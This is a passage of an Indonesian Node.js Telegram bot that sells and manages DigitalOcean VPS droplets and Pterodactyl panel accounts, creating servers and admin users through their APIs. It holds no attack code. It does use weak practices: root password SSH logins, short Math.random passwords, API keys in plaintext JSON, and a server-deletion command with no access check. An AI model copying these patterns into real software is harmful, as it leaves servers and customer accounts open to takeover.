    await bot.sendMessage(chatId, `*VPS BERHASIL DI REBUILD*\nIP VPS: ${ipv4}\nSYSTEM IMAGE: ${droplet.image?.slug || droplet.image?.distribution || 'unknown'}`, { parse_mode: "Markdown" });
  } catch (err) {
    console.error(err?.response?.data || err);
    const msgErr = err?.response?.data?.message || err.message || err;
    await bot.sendMessage(chatId, `❌ Gagal melakukan rebuild VPS: ${msgErr}`);
  }
});

// ---------- /sisadroplet
bot.onText(/^\/sisadroplet$/i, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  if (!isOwner(userId)) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin menggunakan fitur ini.");
  }

  try {
    // Ambil info akun (dapet droplet_limit)
    const accountResp = await axios.get('https://api.digitalocean.com/v2/account', {
      headers: { Authorization: `Bearer ${do_api_key}` }
    });

    // Ambil semua droplet (pakai per_page biar lebih besar, misal 200)
    const dropletsResp = await axios.get('https://api.digitalocean.com/v2/droplets?per_page=200', {
      headers: { Authorization: `Bearer ${do_api_key}` }
    });

    const dropletLimit = accountResp.data.account.droplet_limit;

    // Cara 1: hitung dari meta.total (lebih akurat kalau DO balikin)
    const dropletsCount = dropletsResp.data.meta?.total ?? dropletsResp.data.droplets.length;

    let remainingDroplets = dropletLimit - dropletsCount;
    if (remainingDroplets < 0) remainingDroplets = 0;

    const text =
      `📊 *Info Droplet DigitalOcean*\n\n` +
      `🔹 Batas maksimal droplet: *${dropletLimit}*\n` +
      `🔹 Droplet terpakai: *${dropletsCount}*\n` +
      `🔹 Sisa droplet yang bisa dibuat: *${remainingDroplets}*`;

    await bot.sendMessage(chatId, text, { parse_mode: "Markdown" });
  } catch (err) {
    console.error(err?.response?.data || err);
    const apiMsg = err?.response?.data?.message || err?.response?.data?.id || '';
    await bot.sendMessage(
      chatId,
      `❌ Terjadi kesalahan saat mengambil data droplet.\n\nDetail: ${apiMsg || err.message || err}`
    );
  }
});
// ---------- /deldroplet <id>
bot.onText(/^\/deldroplet(?:\s+(\d+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  if (!isOwner(userId)) return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin menggunakan fitur ini.");
  const dropletId = match[1];
  if (!dropletId) return bot.sendMessage(chatId, "⚠️ Contoh penggunaan: /deldroplet 12345678");

  try {
    const resp = await axios.delete(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
      headers: { Authorization: `Bearer ${do_api_key}` }
    });
    // delete returns 204 on success
    if (resp.status === 204) {
      await bot.sendMessage(chatId, `✅ Droplet ${dropletId} berhasil dihapus!`);
    } else {
      await bot.sendMessage(chatId, `✅ Response: ${resp.status} - ${resp.statusText}`);
    }
  } catch (err) {
    console.error(err?.response?.data || err);
    const msgErr = err?.response?.data?.message || err.message || err;
    await bot.sendMessage(chatId, `❌ Gagal menghapus droplet: ${msgErr}`);
  }
});

// ---------- /cvps <hostname>  -> show options (Telegram inline keyboard used instead of WhatsApp interactive)
bot.onText(/^\/cvps(?:\s+(.+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  if (!isOwner(userId)) return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin menggunakan fitur ini.");

  let hostname = (match && match[1]) ? match[1].trim().toLowerCase() : null;

  // CEK: hostname wajib ada
  if (!hostname) {
    return bot.sendMessage(
      chatId,
      "⚠️ Contoh: /cvps myhostname\n\nLalu pilih spesifikasi VPS yang tersedia."
    );
  }

  // OPSIONAL tapi bagus: blok spasi & karakter aneh (DigitalOcean tidak suka nama pakai spasi)
  hostname = hostname.replace(/\s+/g, '-');        // ganti spasi jadi -
  hostname = hostname.replace(/[^a-z0-9-]/g, '');  // hapus karakter aneh

  // sizes mapping (slugs used in DigitalOcean)
  const sizes = [
    { label: 'Ram 1GB || CPU 1', slug: 's-1vcpu-1gb' },
    { label: 'Ram 2GB || CPU 1', slug: 's-1vcpu-2gb' },
    { label: 'Ram 2GB || CPU 2', slug: 's-2vcpu-2gb' },
    { label: 'Ram 4GB || CPU 2', slug: 's-2vcpu-4gb' },
    { label: 'Ram 8GB || CPU 4', slug: 's-4vcpu-8gb' },
    { label: 'Ram 16GB || CPU 4', slug: 's-4vcpu-16gb-amd' },
    { label: 'Ram 16GB || CPU 8', slug: 's-8vcpu-16gb' }
  ];

  const inlineKeyboard = sizes.map(s => ([
    {
      text: s.label,
      callback_data: `create|${s.slug}|${hostname}`
    }
  ]));

  // NOTE: aku HAPUS parse_mode: "Markdown"
  // Soalnya kalo hostname ada _ atau simbol lain, bisa bikin error formatting.
  await bot.sendMessage(
    chatId,
    `Pilih Spesifikasi VPS untuk hostname: ${hostname}`,
    {
      reply_markup: { inline_keyboard: inlineKeyboard }
    }
  );
});

// ---------- handle callback queries (create droplet)
bot.on('callback_query', async (callbackQuery) => {
  const data = callbackQuery.data;
  const fromId = callbackQuery.from.id;
  const chatId = callbackQuery.message.chat.id;
  const messageId = callbackQuery.message.message_id;

  // only owner can use callbacks
  if (!isOwner(fromId)) {
    await bot.answerCallbackQuery(callbackQuery.id, { text: "❌ Kamu tidak memiliki izin.", show_alert: true });
    return;
  }

  try {
    if (!data) {
      await bot.answerCallbackQuery(callbackQuery.id);
      return;
    }

    const parts = data.split('|');
    const action = parts[0];

    if (action === 'create') {
      const size = parts[1];
      const hostname = parts.slice(2).join('|'); // hostname may contain pipes theoretically

      await bot.answerCallbackQuery(callbackQuery.id, { text: `Membuat droplet ${hostname} (${size})...` });

      // default region
      let region = 'sgp1'; // sesuai WA code
      const imageSlug = 'ubuntu-22-04-x64';

      const password = generateRandomPassword(12);

      // REKOMENDASI: user_data dibikin format cloud-init yang lebih valid
      const userData = `#cloud-config
chpasswd:
  list: |
    root:${password}
  expire: False
ssh_pwauth: True
`;

      const dropletData = {
        name: hostname,
        region,
        size,
        image: imageSlug,
        ssh_keys: [],           // lebih aman pakai array kosong daripada null
        backups: false,
        ipv6: true,
        user_data: userData,
        tags: ['T']
      };

      // create droplet
      const createResp = await axios.post(
        'https://api.digitalocean.com/v2/droplets',
        dropletData,
        {
          headers: {
            Authorization: `Bearer ${do_api_key}`,
            'Content-Type': 'application/json'
          }
        }
      );

      const droplet = createResp.data.droplet;
      const dropletId = droplet.id;

      await bot.sendMessage(
        chatId,
        `✅ Memproses pembuatan vps... ID: ${dropletId}\nMohon tunggu ~60 detik untuk provisioning.`
      );

      // wait provisioning (60s)
      await sleep(60000);

      // fetch droplet info
      const dropletInfoResp = await axios.get(
        `https://api.digitalocean.com/v2/droplets/${dropletId}`,
        {
          headers: { Authorization: `Bearer ${do_api_key}` }
        }
      );

      const fullDroplet = dropletInfoResp.data.droplet;
      const ipv4 = (fullDroplet.networks && fullDroplet.networks.v4)
        ? ((fullDroplet.networks.v4.find(n => n.type === 'public') || {}).ip_address || 'Tidak ada alamat IP yang tersedia')
        : 'Tidak ada alamat IP yang tersedia';

      const messageText =
        `VPS berhasil dibuat!\n\n` +
        `ID: ${dropletId}\n` +
        `IP VPS: ${ipv4}\n` +
        `Password: ${password}\n` +
        `Hostname: ${hostname}`;

      await bot.sendMessage(chatId, messageText);
      return;
    }

    // future callback actions can be added here...
    await bot.answerCallbackQuery(callbackQuery.id); // default ack
  } catch (err) {
    console.error('callback error', err?.response?.data || err);
    await bot.answerCallbackQuery(callbackQuery.id, {
      text: `❌ Terjadi kesalahan: ${err?.response?.data?.message || err.message || err}`,
      show_alert: true
    });
  }
});

// ---------- size command shortcuts: /r1c1 hostname, /r2c1, /r2c2, /r4c2, /r8c4, /r16c4
// (Optional: user can directly call e.g. /r1c1 myhost)
const sizeShortcuts = {
  r1c1: 's-1vcpu-1gb',
  r2c1: 's-1vcpu-2gb',
  r2c2: 's-2vcpu-2gb',
  r4c2: 's-2vcpu-4gb',
  r8c4: 's-4vcpu-8gb',
  r16c4: 's-4vcpu-16gb-amd',
  r16c8: 's-8vcpu-16gb'
};

Object.keys(sizeShortcuts).forEach(cmd => {
  bot.onText(new RegExp(`^\\/${cmd}(?:\\s+(.+))?`, 'i'), async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    if (!isOwner(userId)) return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin menggunakan fitur ini.");

    let hostname = (match && match[1]) ? match[1].trim().toLowerCase() : null;

    if (!hostname) return bot.sendMessage(chatId, `⚠️ Contoh: /${cmd} myhostname`);

    // sama seperti di /cvps → rapihin hostname
    hostname = hostname.replace(/\s+/g, '-');
    hostname = hostname.replace(/[^a-z0-9-]/g, '');

    const size = sizeShortcuts[cmd];

    try {
      await bot.sendMessage(chatId, `Membuat droplet ${hostname} (${cmd})...`);

      const password = generateRandomPassword(12);

      const userData = `#cloud-config
chpasswd:
  list: |
    root:${password}
  expire: False
ssh_pwauth: True
`;

      const dropletData = {
        name: hostname,
        region: 'sgp1',
        size,
        image: 'ubuntu-20-04-x64',
        ssh_keys: [],
        backups: false,
        ipv6: true,
        user_data: userData,
        tags: ['T']
      };

      const createResp = await axios.post(
        'https://api.digitalocean.com/v2/droplets',
        dropletData,
        {
          headers: {
            Authorization: `Bearer ${do_api_key}`,
            'Content-Type': 'application/json'
          }
        }
      );

      const droplet = createResp.data.droplet;
      const dropletId = droplet.id;

      await bot.sendMessage(
        chatId,
        `✅ Droplet dibuat. ID: ${dropletId}\nMenunggu provisioning ~60s...`
      );

      await sleep(60000);

      const infoResp = await axios.get(
        `https://api.digitalocean.com/v2/droplets/${dropletId}`,
        {
          headers: { Authorization: `Bearer ${do_api_key}` }
        }
      );

      const fullDroplet = infoResp.data.droplet;
      const ipv4 = (fullDroplet.networks && fullDroplet.networks.v4)
        ? ((fullDroplet.networks.v4.find(n => n.type === 'public') || {}).ip_address || 'Tidak ada alamat IP yang tersedia')
        : 'Tidak ada alamat IP yang tersedia';

      const createdAt = new Date(fullDroplet.created_at).toLocaleString('id-ID');

const messageText = `
<blockquote>
<b>✅ VPS BERHASIL DIBUAT!</b>
===============================
🆔 ID Droplet: ${dropletId}
👤 Username: root
🌐 IP VPS: ${ipv4}
🔐 Password: ${password}
🖥 Hostname: ${hostname}
📀 OS: ubuntu-22-04-x64
📍 Region: ${fullDroplet.region?.slug || 'sgp1'}
💾 Size: ${fullDroplet.size_slug}
⏰ Created: ${createdAt}
===============================
🎉 <b>GARANSI AKTIF 10 HARI</b>
Apabila tidak melanggar T.O.S
===============================

⚠️ <b>𝗧.𝗢.𝗦 VPS</b>
• Dilarang Hacking
• Dilarang Mining
• Dilarang Torrent
• Dilarang Overload CPU
• Dilarang DDoS
• Dilarang Aktivitas Ilegal

👉 Gunakan VPS dengan bijak & sesuai kebutuhan.

===============================

🏪 <b>𝗧.𝗢.𝗦 TOKO</b>
• Web toko down (DDoS) → Garansi AKTIF
• VPS mati akibat DDoS → Garansi HANGUS
• CPU 100% terus → Garansi HANGUS
• Data VPS tanggung jawab pembeli

===============================

📛 <b>KETENTUAN AKUN DO SUSPEND</b>
• Garansi berlaku 2 hari sejak pembelian
• Hari ke-3 → Garansi TIDAK berlaku

===============================

📝 <b>SYARAT CLAIM GARANSI</b>
1. Bukti transfer
2. Screenshot chat
3. Tanggal pembelian
4. Data VPS lengkap

===============================

📢 <b>PERINGATAN</b>
Dilarang copy-paste tanpa izin.
UU Hak Cipta No. 28 Tahun 2014
===============================
</blockquote>
`;

await bot.sendMessage(chatId, messageText, { parse_mode: "HTML" });
    } catch (err) {
      console.error(err?.response?.data || err);
      await bot.sendMessage(
        chatId,
        `❌ Terjadi kesalahan saat membuat VPS: ${err?.response?.data?.message || err.message || err}`
      );
    }
  });
});

const eggid = 15;
const nestid = 5;

const FOTO_URL = "https://gangalink.vercel.app/i/n00kd4tm.jpg";

// ================= EFFECT =================
const privateEffect = (chatType) => {
  return chatType === "private"
    ? { message_effect_id: "5104841245755180586" }
    : {};
};

// ================= FILE =================
const cpanelFile = "./cpanel.json";
if (!fs.existsSync(cpanelFile)) fs.writeFileSync(cpanelFile, "[]");

// ================= STATE =================
const addPanelState = {};
const tempCreate = {};
const cadpState = {};
const delState = {};


// LOCK USER BIAR GA BISA CLICK ORANG LAIN
const lockedUser = {};

let BOT_USERNAME = "";

bot.getMe().then((res) => {
  BOT_USERNAME = res.username;
  console.log("Bot username:", BOT_USERNAME);
});
// ================= UTILS =================
function isOwner(id) {
  return OWNER_ID.includes(id);
}

function readCpanel() {
  return JSON.parse(fs.readFileSync(cpanelFile));
}

function saveCpanel(d) {
  fs.writeFileSync(cpanelFile, JSON.stringify(d, null, 2));
}

function randomPass() {
  return Math.random().toString(36).slice(2, 8);
}

// ================= SET PANEL =================
bot.onText(/\/setpanel/, (msg) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    const chatType = msg.chat.type;
    
  if (!isOwner(senderId)) {
        return bot.sendMessage(chatId, '❌ Kamu tidak memiliki izin menggunakan fitur ini.');
    }

  addPanelState[msg.from.id] = { step: "domain", data: {} };
  bot.sendMessage(msg.chat.id, "🌐 Kirim domain panel:");
});

bot.on("message", (msg) => {
  const st = addPanelState[msg.from.id];
  if (!st) return;

  const text = msg.text;
  if (!text || text.startsWith("/")) return;

  if (st.step === "domain") {
    st.data.domain = text;
    st.step = "plta";
    return bot.sendMessage(msg.chat.id, "🔑 Kirim PLTA:");
  }

  if (st.step === "plta") {
    st.data.plta = text;
    st.step = "pltc";
    return bot.sendMessage(msg.chat.id, "🔑 Kirim PLTC:");
  }

  if (st.step === "pltc") {
    let panels = readCpanel();

    panels.push({
      id: panels.length + 1,
      domain: st.data.domain,
      plta: st.data.plta,
      pltc: st.data.pltc
    });

    saveCpanel(panels);
    delete addPanelState[msg.from.id];

    return bot.sendMessage(msg.chat.id, "✅ Panel tersimpan");
  }
});

bot.onText(/\/listpanel/, (msg) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    const chatType = msg.chat.type;
    
  if (!isOwner(senderId)) {
        return bot.sendMessage(chatId, '❌ Kamu tidak memiliki izin menggunakan fitur ini.');
    }

  const panels = readCpanel();

  if (!panels.length) {
    return bot.sendMessage(
      msg.chat.id,
      `<blockquote>❌ TIDAK ADA PANEL TERDAFTAR</blockquote>`,
      { parse_mode: "HTML" }
    );
  }

  let text = `<blockquote>📦 LIST PANEL AKTIF\n━━━━━━━━━━━━━━\n\n`;

  panels.forEach((p, i) => {
    text += `🔢 SERVER #${i + 1}\n`;
    text += `🌐 DOMAIN : ${p.domain}\n`;
    text += `🔑 PLTA   : ****\n`;
    text += `🔑 PLTC   : ****\n`;
    text += `━━━━━━━━━━━━━━\n\n`;
  });

  text += `📊 TOTAL PANEL: ${panels.length}</blockquote>`;

  bot.sendMessage(msg.chat.id, text, { parse_mode: "HTML" });
});

bot.onText(/\/delpanel(?:\s+(\d+))?$/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    const chatType = msg.chat.type;

    if (!isOwner(senderId)) {
        return bot.sendMessage(chatId, '❌ Kamu tidak memiliki izin menggunakan fitur ini.');
    }

    let panels = readCpanel();
    const num = parseInt(match?.[1]);

    // ================= FORMAT CHECK =================
    if (!num) {
        return bot.sendMessage(chatId,
`<blockquote>⚠️ FORMAT SALAH

🗑 FUNGSI COMMAND:
Menghapus data panel yang tersimpan (PLTA & PLTC)

📦 DATA YANG DIHAPUS:
• API KEY PLTA
• API KEY PLTC
• DATA PANEL TERSIMPAN

📌 CARA PAKAI:
/delpanel 1

💡 CATATAN:
Gunakan nomor sesuai daftar panel yang tersimpan</blockquote>`,
        { parse_mode: "HTML" }
        );
    }

  if (num < 1 || num > panels.length) {
    return bot.sendMessage(
      msg.chat.id,
      `<blockquote>❌ NOMOR PANEL TIDAK VALID</blockquote>`,
      { parse_mode: "HTML" }
    );
  }

  const removed = panels.splice(num - 1, 1);
  saveCpanel(panels);

  bot.sendMessage(
    msg.chat.id,
`<blockquote>🗑 PANEL BERHASIL DIHAPUS

🌐 DOMAIN : ${removed[0].domain}
📦 STATUS : REMOVED
</blockquote>`,
    { parse_mode: "HTML" }
  );
});

// ================= LIST SERVER PER PANEL =================
bot.onText(/\/listserver/, async (msg) => {
    const chatId = msg.chat.id;
  const userId = msg.from.id;
  const senderId = msg.from.id;
  const chatType = msg.chat.type;
  const isPremium = await premium(senderId);
    
  const groupAllowed = chatType !== "private" && isGroupAllowed(chatId);
    if (!isPremium && !groupAllowed) {
      return bot.sendMessage(chatId, "Fitur ini hanya untuk user Premium / Group premium.");
    }

  const panels = readCpanel();

  if (!panels.length) {
    return bot.sendMessage(msg.chat.id,
      `<blockquote>❌ Tidak ada panel tersimpan</blockquote>`,
      { parse_mode: "HTML" }
    );
  }

  let text = `📊 DATA SERVER PANEL\n━━━━━━━━━━━━━━\n\n`;

  for (let i = 0; i < panels.length; i++) {
    const panel = panels[i];

    let total = "ERROR";

    try {
      const res = await axios.get(
        `${panel.domain}/api/application/servers`,
        {
          headers: {
            Authorization: `Bearer ${panel.plta}`,
            Accept: "application/json"
          }
        }
      );

      total = res.data.meta?.pagination?.total || res.data.data.length;

    } catch (e) {
      total = "OFFLINE / INVALID";
    }

    text += `🖥 SERVER #${i + 1}\n`;
    text += `🌐 DOMAIN : ${panel.domain}\n`;
    text += `📦 TOTAL  : ${total}\n`;
    text += `━━━━━━━━━━━━━━\n\n`;
  }

  text += `📊 TOTAL PANEL : ${panels.length}`;

  bot.sendMessage(msg.chat.id, `<blockquote>${text}</blockquote>`, {
    parse_mode: "HTML"
  });
});

// ================= COMMAND DELSERVER =================
bot.onText(/\/delserver/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const senderId = msg.from.id;
  const chatType = msg.chat.type;
  const isPremium = await premium(senderId);

  const panels = readCpanel();

  if (!panels.length) {
    return bot.sendMessage(chatId,
      `<blockquote>❌ Tidak ada panel</blockquote>`,
      { parse_mode: "HTML" }
    );
  }

  let btn = panels.map((p, i) => ([{
    text: `🟢 PANEL ${i + 1}`,
    callback_data: `delpanel_${i}_${userId}`
  }]));

  bot.sendMessage(chatId,
    `<blockquote>📊 Pilih panel</blockquote>`,
    {
      parse_mode: "HTML",
      reply_markup: { inline_keyboard: btn }
    }
  );
});

// ================= COMMAND CADP =================
bot.onText(/\/cadp(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const senderId = msg.from.id;
  const chatType = msg.chat.type;
  const isPremium = await premium(senderId);

  const name = match?.[1];
  const panels = readCpanel();
 
  // ================= FORMAT CHECK =================
  if (!name) {
    return bot.sendMessage(chatId,
`<blockquote>❗ FORMAT SALAH

Cara pakai:

/cadp raraa</blockquote>`,
      { parse_mode: "HTML" }
    );
  }

  const groupAllowed = chatType !== "private" && isGroupAllowed(chatId);
    if (!isPremium && !groupAllowed) {
      return bot.sendMessage(chatId, "Fitur ini hanya untuk user Premium / Group premium.");
    }
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
      return bot.sendMessage(chatId, 'HANYA AKSES ADMIN YANG BISA MENGGUNAKAN FITUR INI');
    }
  if (!panels.length) {
    return bot.sendMessage(chatId,
      `<blockquote>❌ Tidak ada panel tersedia</blockquote>`,
      { parse_mode: "HTML" }
    );
  }

  cadpState[userId] = { name };

  let btn = panels.map((p, i) => ([{
    text: `🟢 PANEL ${i + 1}`,
    callback_data: `cadp_${i}_${userId}`
  }]));

  bot.sendMessage(chatId,
    `<blockquote>📊 Pilih panel untuk membuat admin</blockquote>`,
    {
      parse_mode: "HTML",
      reply_markup: { inline_keyboard: btn }
    }
  );
});

// ================= LIST SERVER =================
async function sendServerList(chatId, userId, panelIndex, page = 0) {
  const panels = readCpanel();
  const panel = panels[panelIndex];

  if (!panel) return;

  try {
    const res = await axios.get(
      `${panel.domain}/api/application/servers`,
      {
        headers: {
          Authorization: `Bearer ${panel.plta}`,
          Accept: "application/json"
        }
      }
    );

    const servers = res.data.data;
    const perPage = 5;
    const start = page * perPage;
    const sliced = servers.slice(start, start + perPage);

    let btn = sliced.map((srv, i) => ([{
      text: srv.attributes.name,
      callback_data: `delsrv_${panelIndex}_${start + i}_${userId}`
    }]));

    let nav = [];
    if (page > 0) {
      nav.push({
        text: "⬅️ Back",
        callback_data: `page_${panelIndex}_${page - 1}_${userId}`
      });
    }
    if (start + perPage < servers.length) {
      nav.push({
        text: "➡️ Next",
        callback_data: `page_${panelIndex}_${page + 1}_${userId}`
      });
    }

    if (nav.length) btn.push(nav);

    await bot.sendMessage(chatId,
      `<blockquote>📦 Pilih server</blockquote>`,
      {
        parse_mode: "HTML",
        reply_markup: { inline_keyboard: btn }
      }
    );

  } catch {
    bot.sendMessage(chatId, "❌ Gagal ambil server");
  }
}

// ================= CALLBACK GLOBAL =================
bot.on("callback_query", async (q) => {

  // ===== DEL PANEL =====
  if (q.data.startsWith("delpanel_")) {
    const [_, panelIndex, userId] = q.data.split("_");

    if (+userId !== q.from.id) return;

    await bot.deleteMessage(q.message.chat.id, q.message.message_id).catch(()=>{});
    sendServerList(q.message.chat.id, q.from.id, panelIndex, 0);
  }

  // ===== PAGINATION =====
  if (q.data.startsWith("page_")) {
    const [_, panelIndex, page, userId] = q.data.split("_");

    if (+userId !== q.from.id) return;

    await bot.deleteMessage(q.message.chat.id, q.message.message_id).catch(()=>{});
    sendServerList(q.message.chat.id, q.from.id, panelIndex, +page);
  }

  // ===== DELETE SERVER =====
  if (q.data.startsWith("delsrv_")) {
    const [_, panelIndex, srvIndex, userId] = q.data.split("_");

    if (+userId !== q.from.id) return;

    const panel = readCpanel()[panelIndex];
    if (!panel) return;

    await bot.deleteMessage(q.message.chat.id, q.message.message_id).catch(()=>{});

    try {
      const res = await axios.get(
        `${panel.domain}/api/application/servers`,
        {
          headers: {
            Authorization: `Bearer ${panel.plta}`
          }
        }
      );

      const srv = res.data.data[srvIndex];
      const id = srv.attributes.id;
      const usr = srv.attributes.user;
      const name = srv.attributes.name;

      // DELETE USER
      await axios.delete(
        `${panel.domain}/api/application/users/${usr}`,
        { headers: { Authorization: `Bearer ${panel.plta}` } }
      ).catch(()=>{});

      // DELETE SERVER
      await axios.delete(
        `${panel.domain}/api/application/servers/${id}`,
        { headers: { Authorization: `Bearer ${panel.plta}` } }
      );

      bot.sendMessage(q.message.chat.id,
`<blockquote>🗑 SERVER DIHAPUS

📦 ${name}
🌐 ${panel.domain}
</blockquote>`,
        { parse_mode: "HTML" }
      );

    } catch {
      bot.sendMessage(q.message.chat.id, "❌ Gagal hapus server");
    }
  }

 // ===== CADP (CREATE ADMIN) =====
if (q.data.startsWith("cadp_")) {
  const [_, panelIndex, userId] = q.data.split("_");

  if (+userId !== q.from.id) return;

  const data = cadpState[q.from.id];
  const panel = readCpanel()[panelIndex];

  if (!panel || !data) return;

  await bot.deleteMessage(q.message.chat.id, q.message.message_id).catch(()=>{});

  const username = data.name.toLowerCase().replace(/[^a-z0-9]/g, "");
  const password = Math.random().toString(36).slice(2, 8);
  const email = `${username}@admin.com`;

  try {
    await axios.post(
      `${panel.domain}/api/application/users`,
      {
        username,
        email,
        first_name: username,
        last_name: "Admin",
        password,
        root_admin: true
      },
      {
        headers: {
          Authorization: `Bearer ${panel.plta}`
        }
      }
    );

    // ================= EFFECT PRIVATE =================
    const STICKER_1 = "CAACAgIAAxkBAAEcQnNpu8-VjAL34gABVxlr_Yo8XrBtRFgAAg4QAAJyjqhIVNHxNhpNkeU6BA";
    const STICKER_2 = "CAACAgIAAxkBAAEcQnVpu8-9r6E6YfKGym4Ka36UQY64YQACaAwAAsrzQUho2H6uvZRtxToE";

    const s1 = await bot.sendSticker(q.from.id, STICKER_1);
    await new Promise(r => setTimeout(r, 1200));
    bot.deleteMessage(q.from.id, s1.message_id).catch(()=>{});

    const s2 = await bot.sendSticker(q.from.id, STICKER_2);
    await new Promise(r => setTimeout(r, 1200));
    bot.deleteMessage(q.from.id, s2.message_id).catch(()=>{});

    const text =
`<blockquote>👑 ADMIN PANEL BERHASIL DIBUAT

👤 USERNAME : ${username}
📧 EMAIL    : ${email}
🔑 PASSWORD : ${password}
🌐 PANEL    : ${panel.domain}

━━━━━━━━━━━━━━
⚠️ Simpan data ini baik-baik
</blockquote>`;

    await bot.sendPhoto(q.from.id, FOTO_URL, {
      caption: text,
      parse_mode: "HTML",
      ...privateEffect("private")
    });

    delete cadpState[q.from.id];

  } catch (err) {
    bot.sendMessage(q.from.id, "❌ Gagal membuat admin panel");
  }
}
});
// ================= PANEL SELECT (FIX ONLINE CHECK) =================
async function checkPanelStatus(domain) {
  try {
    await axios.get(domain, { timeout: 3000 });
    return true; // ON
  } catch {
    return false; // OFF
  }
}

async function sendPanelSelector(chatId, userId) {
  const panels = readCpanel();

  let btn = [];

  for (let i = 0; i < panels.length; i++) {
    btn.push([{
      text: `🟢 SERVER ${i + 1}`,
      callback_data: `select_${i}_${userId}`
    }]);
  }

  // 🔴 CANCEL BUTTON
  btn.push([{
    text: "❌ CANCEL",
    callback_data: `cancel_${userId}`
  }]);

  const sent = await bot.sendMessage(
    chatId,
    `<blockquote>📊 PILIH SERVER PANEL</blockquote>`,
    {
      parse_mode: "HTML",
      reply_markup: { inline_keyboard: btn }
    }
  );

  // auto delete message + button
  setTimeout(() => {
    bot.deleteMessage(chatId, sent.message_id).catch(() => {});
  }, 60000);
}

  // ================= NORMAL SELECT =================
bot.on("callback_query", async (q) => {
  // ================= CANCEL =================
  if (q.data.startsWith("cancel_")) {
    const userId = parseInt(q.data.split("_")[1]);

    if (userId !== q.from.id) {
      return bot.answerCallbackQuery(q.id, {
        text: "❌ Ini tombol bukan milik kamu!",
        show_alert: true
      });
    }

    try {
      await bot.deleteMessage(q.message.chat.id, q.message.message_id);
    } catch {}

    return;
  }

  // ================= STRUCTURE ASLI =================
  const [_, index, userId] = q.data.split("_");

  if (parseInt(userId) !== q.from.id) {
    return bot.answerCallbackQuery(q.id, {
      text: "❌ Ini tombol bukan milik kamu!",
      show_alert: true
    });
  }

  const panels = readCpanel();
  const panel = panels[index];
  const data = tempCreate[q.from.id];

  if (!panel || !data) return;

  lockedUser[q.from.id] = panel;

  try {
    await bot.deleteMessage(q.message.chat.id, q.message.message_id);
  } catch {}

  await bot.sendMessage(q.message.chat.id, "⏳ Sedang membuat server panel...");

  const server = await createServer({
    panel,
    ...data
  });

  if (!server) {
    delete tempCreate[q.from.id];
    return bot.sendMessage(q.message.chat.id, "❌ Gagal membuat server");
  }

  // ================= STICKER EFFECT =================
  const STICKER_1 = "CAACAgIAAxkBAAEcQnNpu8-VjAL34gABVxlr_Yo8XrBtRFgAAg4QAAJyjqhIVNHxNhpNkeU6BA";
  const STICKER_2 = "CAACAgIAAxkBAAEcQnVpu8-9r6E6YfKGym4Ka36UQY64YQACaAwAAsrzQUho2H6uvZRtxToE";
  const STICKER_3 = "CAACAgIAAxkBAAEcQndpu8_j0euvZXr28DcS-Oj-WMpPvQACSwADJHFiGgmyhtppUJ4YOgQ";

  const s1 = await bot.sendSticker(q.message.chat.id, STICKER_1);
  await new Promise(r => setTimeout(r, 1500));
  bot.deleteMessage(q.message.chat.id, s1.message_id).catch(() => {});

  const s2 = await bot.sendSticker(q.message.chat.id, STICKER_2);
  await new Promise(r => setTimeout(r, 1500));
  bot.deleteMessage(q.message.chat.id, s2.message_id).catch(() => {});

  const s3 = await bot.sendSticker(q.message.chat.id, STICKER_3);
  await new Promise(r => setTimeout(r, 1500));
  bot.deleteMessage(q.message.chat.id, s3.message_id).catch(() => {});

  // ================= FINAL MESSAGE FIX =================
  const text =
`<blockquote>✅ PANEL BERHASIL DIBUAT

📧 EMAIL    : ${server.email}
👤 USERNAME : ${server.username}
🔑 PASSWORD : ${server.password}
🆔 ID SERVER: ${server.id}

💾 RAM      : ${data.text}
🌐 DOMAIN   : ${panel.domain}

━━━━━━━━━━━━━━
📜 GARANSI & CLAIM
🛡 Garansi aktif 15 hari
📩 Claim wajib sertakan bukti screenshot
⛔ Tanpa bukti = tidak akan diproses

━━━━━━━━━━━━━━
📜 RULES / PERATURAN
🚫 Dilarang DDoS / attack server
🚫 Dilarang sebar panel ke orang lain
🚫 Dilarang sebar domain / link panel
🚫 Dilarang abuse resource server
🚫 Dilarang jual ulang tanpa izin

⚠️ Pelanggaran = server dihapus tanpa refund
━━━━━━━━━━━━━━</blockquote>`;

  await bot.sendPhoto(q.from.id, FOTO_URL, {
    caption: text,
    parse_mode: "HTML",
    ...privateEffect("private")
  });

  // ================= GROUP NOTIF FIX =================
  bot.sendMessage(
q.message.chat.id,
  `<blockquote>📤 DATA SERVER PANEL SUDAH DI KIRIM

👤 KE USER : @${q.from.username || "unknown"}
🆔 ID      : ${q.from.id}</blockquote>`,
  { parse_mode: "HTML" }
);

  delete tempCreate[q.from.id];
});
// ================= PANEL CONTEXT =================
function buildCtx(panel) {
  return {
    url: panel.domain,
    key: panel.plta,
    nest: nestid,
    egg: eggid,
    location: 1
  };
}

// ================= ALLOCATION FIX =================
async function getAllocation(panel) {
  const ctx = buildCtx(panel);

  try {
    const nodes = await axios.get(`${ctx.url}/api/application/nodes`, {
      headers: { Authorization: `Bearer ${ctx.key}` }
    });

    for (const node of nodes.data.data) {
      if (node.attributes.location_id !== ctx.location) continue;

      const alloc = await axios.get(
        `${ctx.url}/api/application/nodes/${node.attributes.id}/allocations`,
        { headers: { Authorization: `Bearer ${ctx.key}` } }
      );

      const free = alloc.data.data.find(a => !a.attributes.assigned);
      if (free) return free.attributes.id;
    }

    return null;
  } catch {
    return null;
  }
}

// ================= EGG ENV =================
async function getEggEnv(panel) {
  const ctx = buildCtx(panel);

  try {
    const res = await axios.get(
      `${ctx.url}/api/application/nests/${ctx.nest}/eggs/${ctx.egg}?include=variables`,
